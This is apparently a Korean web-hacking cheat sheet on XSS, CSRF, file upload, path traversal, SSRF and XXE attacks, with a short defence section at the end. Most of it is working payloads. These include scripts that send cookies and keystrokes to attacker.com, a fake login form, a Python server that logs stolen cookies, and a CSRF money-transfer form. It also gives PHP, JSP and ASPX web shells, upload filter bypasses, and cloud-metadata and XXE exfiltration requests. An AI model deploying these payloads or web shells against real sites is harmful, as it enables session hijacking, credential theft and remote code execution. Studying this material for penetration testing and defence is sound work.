# XSS / CSRF / 파일 업로드 취약점

## 1. XSS (Cross-Site Scripting)

### XSS 유형

| 유형 | 저장 여부 | 설명 |
|------|-----------|------|
| Stored XSS | DB에 저장 | 게시판, 프로필 등에 영구 저장 → 가장 위험 |
| Reflected XSS | 미저장 | URL 파라미터에 삽입 → 피싱 링크 |
| DOM-based XSS | 클라이언트 | JavaScript로 DOM 조작 시 발생 |

---

### 1-1. Stored XSS (저장형)

```html
<!-- 게시판 글 작성 시 삽입 -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

**실제 공격 시나리오:**
```javascript
// 쿠키 탈취 → 세션 하이재킹
<script>
  new Image().src = "http://attacker.com/steal?c=" + document.cookie;
</script>

// 키로거
<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = "http://attacker.com/key?k=" + e.key;
  });
</script>

// 자격증명 피싱
<script>
  document.body.innerHTML = '<form action="http://attacker.com/phish" method="POST">'
    + '<input name="user" placeholder="Username">'
    + '<input name="pass" type="password" placeholder="Password">'
    + '<input type="submit"></form>';
</script>

// BeEF Hook (브라우저 익스플로잇)
<script src="http://attacker.com:3000/hook.js"></script>
```

---

### 1-2. Reflected XSS (반사형)

```
취약한 URL:
http://target.com/search?q=<script>alert(1)</script>

피싱 링크:
http://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**URL 인코딩된 페이로드:**
```
http://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

### 1-3. DOM-based XSS

```javascript
// 취약한 코드
var name = document.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// 공격 URL
http://target.com/page#<img src=x onerror=alert(1)>

// location.href 악용
document.write('<a href="' + location.href + '">link</a>');
// 공격: javascript:alert(1) 삽입
```

---

### 1-4. XSS 필터 우회

```html
<!-- 태그 필터 우회 -->
<ScRiPt>alert(1)</ScRiPt>                 (대소문자 혼합)
<scr<script>ipt>alert(1)</scr</script>ipt>   (이중 삽입)
<img src=1 onerror=alert(1)>              (이벤트 핸들러)
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>

<!-- 따옴표 없이 -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>             (백틱)

<!-- 공백 우회 -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- HTML 엔티티 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">

<!-- 프로토콜 우회 -->
<a href="JaVaScRiPt:alert(1)">
<a href="java&#9;script:alert(1)">    (탭 문자)
<a href="java&#10;script:alert(1)">   (개행)

<!-- CSP 우회 (JSONP 엔드포인트 활용) -->
<script src="https://trusted.com/api?callback=alert(1)"></script>

<!-- SVG 내부 스크립트 -->
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>

<!-- 인코딩 우회 -->
\u003cscript\u003ealert(1)\u003c/script\u003e   (유니코드)
```

---

### 1-5. XSS 쿠키 탈취 서버 만들기

```python
# Python HTTP 서버 (쿠키 수신)
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class XSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if 'c' in params:
            print(f"[+] 쿠키 탈취: {params['c'][0]}")
            with open('stolen_cookies.txt', 'a') as f:
                f.write(f"{self.client_address[0]}: {params['c'][0]}\n")
        
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # 로그 숨김

server = HTTPServer(('0.0.0.0', 80), XSSHandler)
print("[*] XSS 수신 서버 시작...")
server.serve_forever()
```

---

## 2. CSRF (Cross-Site Request Forgery)

### 원리
```
1. 피해자 → 은행 사이트 로그인 (세션 쿠키 발급)
2. 공격자 → 악성 페이지 제작 (자동 요청 코드 삽입)
3. 피해자 → 악성 페이지 방문
4. 브라우저 → 피해자 쿠키와 함께 은행에 요청 자동 전송
5. 은행 → 피해자가 요청한 것으로 간주하여 처리
```

### CSRF 페이로드

**GET 방식 CSRF:**
```html
<!-- 이미지 태그로 자동 요청 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">

<!-- iframe 사용 -->
<iframe src="http://bank.com/delete_account" style="display:none">
```

**POST 방식 CSRF:**
```html
<!-- 자동 제출 폼 -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**JSON CSRF (Content-Type 우회):**
```html
<!-- application/x-www-form-urlencoded로 JSON 흉내 -->
<form action="http://api.target.com/user/update" method="POST"
      enctype="text/plain">
  <input name='{"admin":true,"ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### CSRF 토큰 우회

```
1. CSRF 토큰 미검증 → 토큰 없이 요청
2. Same-site 요청으로 토큰 획득 (XSS 연계)
   - XSS로 토큰 값 읽어서 CSRF 요청에 포함
3. Referrer 헤더 우회
   - Referrer 없이 요청
   - Referrer 위조
4. 예측 가능한 토큰 → 브루트포스
```

---

## 3. 파일 업로드 취약점

### 공격 목표
서버에 웹쉘(악성 스크립트)을 업로드하여 원격 명령 실행(RCE)

### 3-1. 기본 웹쉘

**PHP 웹쉘:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_POST['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php eval($_POST['code']); ?>

<!-- 더 강력한 웹쉘 -->
<?php
$cmd = ($_REQUEST['cmd'] ?? '');
echo '<pre>' . shell_exec($cmd) . '</pre>';
?>
```

**JSP 웹쉘 (Java 서버):**
```jsp
<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>
```

**ASPX 웹쉘 (.NET 서버):**
```csharp
<%@ Page Language="C#" %>
<%
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

---

### 3-2. 확장자 필터 우회

**PHP 대체 확장자:**
```
.php
.php3  .php4  .php5  .php7
.phtml  .pht  .shtml
.pHp  .PhP  (대소문자 우회)
.php.bak  (이중 확장자)
```

**서버 설정 악용:**
```
.php%00.jpg     (Null byte — PHP 5.3 이하)
.php .jpg       (공백 + 확장자)
.php%20.jpg     (URL 인코딩 공백)
shell.php;.jpg  (세미콜론 우회 — Apache 일부 버전)
```

**Content-Type 우회:**
```
업로드 시 Content-Type: image/jpeg 로 변조
Burp Suite Intercept → Content-Type 수정
```

**파일 시그니처 우회 (Magic Bytes):**
```
PHP 코드 앞에 이미지 헤더 추가:
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

GIF 헤더 + PHP:
GIF89a<?php system($_GET['cmd']); ?>

실제 이미지 파일에 PHP 코드 삽입 (ExifTool):
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

### 3-3. 업로드 경로 확인

```bash
# 업로드 후 접근 경로 추측
http://target.com/uploads/shell.php
http://target.com/files/shell.php
http://target.com/media/shell.php
http://target.com/images/shell.php

# 디렉토리 열거
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

### 3-4. LFI → 파일 업로드 연계 (Log Poisoning)

```
1. 웹 서버 로그에 PHP 코드 삽입
   User-Agent: <?php system($_GET['cmd']); ?>

2. LFI로 로그 파일 실행
   http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
```

---

## 4. 기타 주요 웹 취약점

### 4-1. Directory Traversal (경로 탐색)

```
http://target.com/download?file=../../../etc/passwd
http://target.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/download?file=....//....//etc/passwd   (필터 우회)
http://target.com/download?file=%2Fetc%2Fpasswd

# 주요 타겟 파일
/etc/passwd          (사용자 목록)
/etc/shadow          (해시된 비밀번호, root 필요)
/etc/hosts
/etc/ssh/sshd_config
/var/log/apache2/access.log
/var/www/html/config.php
/proc/self/environ   (환경 변수 — PHP 코드 삽입 가능)
```

### 4-2. SSRF (Server-Side Request Forgery)

```
# 내부망 탐색
http://target.com/fetch?url=http://192.168.1.1/
http://target.com/fetch?url=http://127.0.0.1/admin

# 클라우드 메타데이터 탈취
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF 우회
http://0.0.0.0/               (127.0.0.1 대체)
http://[::1]/                 (IPv6 루프백)
http://localhost.evil.com/    (DNS 리바인딩)
http://①②⑦.⓪.⓪.①/         (유니코드 숫자)

# SSRF → 내부 서비스 공격
http://target.com/fetch?url=dict://127.0.0.1:6379/   (Redis)
http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis 명령)
```

### 4-3. XXE (XML External Entity)

```xml
<!-- 기본 XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF 연계 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.server/admin">
]>
<data>&xxe;</data>

<!-- 외부 DTD 파일 참조 (Out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>

<!-- evil.dtd 내용 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
```

---

## 5. Burp Suite 실전 활용

### 필수 기능

```
1. Proxy (Intercept)
   - HTTP/HTTPS 트래픽 가로채기/수정
   - 브라우저 → Burp → 서버

2. Repeater
   - 요청 반복 전송 및 수정
   - 수동 테스트 핵심 도구

3. Intruder (자동화 공격)
   - Sniper: 하나의 파라미터에 페이로드 목록
   - Battering Ram: 모든 파라미터에 동일 페이로드
   - Pitchfork: 여러 파라미터에 각각 다른 페이로드
   - Cluster Bomb: 모든 조합 시도 (브루트포스)

4. Scanner (Pro 버전)
   - 자동 취약점 스캔

5. Decoder
   - URL/Base64/HTML/Hex 인코딩/디코딩

6. Comparer
   - 두 응답 비교 (차이 강조)

7. Sequencer
   - 토큰 랜덤성 분석 (CSRF 토큰, 세션 ID)
```

### Burp로 XSS 찾기
```
1. Proxy로 모든 입력 파라미터 식별
2. Repeater에서 각 파라미터에 <xss> 삽입
3. 응답에서 <xss>가 그대로 반환되면 XSS 가능
4. 실제 페이로드 시도 (alert, 쿠키 탈취)
```

### Burp로 SQL Injection 찾기
```
1. Repeater에서 파라미터에 ' 삽입 → SQL 오류 확인
2. 파라미터에 ' AND '1'='1 vs ' AND '1'='2 응답 비교
3. SQLMap과 연동: --proxy=http://127.0.0.1:8080
```

---

## 6. XSS 방어

### 출력 인코딩 (가장 중요)
```python
# Python (Flask)
from markupsafe import escape
safe_output = escape(user_input)

# HTML 특수문자 인코딩
& → &amp;
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

### Content Security Policy (CSP)
```http
# 가장 엄격한 CSP
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'

# nonce 기반 (인라인 스크립트 허용)
Content-Security-Policy: script-src 'nonce-{random_value}'
<script nonce="{random_value}">/* 허용된 스크립트 */</script>
```

### HttpOnly, Secure 쿠키
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly  → JavaScript에서 document.cookie 접근 불가 (XSS 쿠키 탈취 방어)
Secure    → HTTPS에서만 쿠키 전송
SameSite=Strict → 외부 사이트에서 쿠키 미전송 (CSRF 방어)
```

### CSRF 방어
```python
# CSRF 토큰 검증 (Flask-WTF 예시)
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# HTML 폼에 토큰 포함
<form method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>

# SameSite 쿠키로 CSRF 방어
Set-Cookie: session=abc; SameSite=Strict
```
